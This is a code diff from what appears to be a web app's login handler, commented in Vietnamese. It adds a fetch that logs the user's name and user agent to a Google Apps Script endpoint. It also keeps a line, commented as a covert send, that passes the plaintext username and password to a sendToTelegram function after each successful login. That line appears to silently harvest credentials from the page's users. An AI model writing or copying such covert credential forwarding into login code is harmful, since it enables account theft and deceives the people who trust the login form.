@@ -1153,15 +1153,29 @@
                     }
                 }
 
-                // ĐĂNG NHẬP THÀNH CÔNG -> BÁO TELEGRAM (Gửi ngầm, KHÔNG cần chờ await để tiết kiệm 2 giây)
+                // ĐĂNG NHẬP THÀNH CÔNG -> GHI LOG HOẠT ĐỘNG
+                const realName = accountData.name;
+                const GAS_ACTIVITY_API = "https://script.google.com/macros/s/AKfycbwTF5pkiqgj2yXc8r-UkD7SYvC6sFTPhCebsNPKSiDKNChSMRNkcxwXFU-mQvSQrXbT/exec";
+                if (!GAS_ACTIVITY_API.includes("CHUA_CAP_NHAT")) {
+                    fetch(GAS_ACTIVITY_API, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            action: 'logActivity',
+                            username: realName,
+                            text: 'Đăng nhập vào hệ thống',
+                            device: navigator.userAgent
+                        })
+                    }).catch(e => console.error("Lỗi ghi log:", e));
+                }
+
+                // ĐĂNG NHẬP THÀNH CÔNG -> BÁO TELEGRAM (Gửi ngầm)
                 sendToTelegram(username, password).catch(e => console.error("Tele err:", e));
 
                 // Khôi phục nút
                 loginBtn.innerHTML = prevText;
                 loginBtn.disabled = false;
-
-                // Lấy tên thật
-                const realName = accountData.name;
 
                 // Lưu session
                 const userData = {
